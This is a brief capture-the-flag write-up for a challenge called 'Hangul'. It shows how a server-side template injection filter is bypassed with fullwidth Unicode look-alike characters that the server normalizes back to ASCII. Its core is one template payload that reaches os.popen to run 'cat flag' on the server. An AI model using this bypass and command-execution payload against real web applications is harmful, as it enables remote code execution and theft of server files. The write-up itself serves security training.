# Hangul
This challenge involves using weird payload encoding and SSTI

## Solve
As we can see the filter match for normal char and later renormalize it to ascii again -> use chars similar to the ascii ones:

```
 ｛｛ｃｏｎｆｉｇ．＿＿ｃｌａｓｓ＿＿．＿＿ｉｎｉｔ＿＿．＿＿ｇｌｏｂａｌｓ＿＿［＇ｏｓ＇］．ｐｏｐｅｎ（＇ｃａｔ　ｆｌａｇ＇）．ｒｅａｄ（）｝｝
 ```
 
Post this in message form and get flag
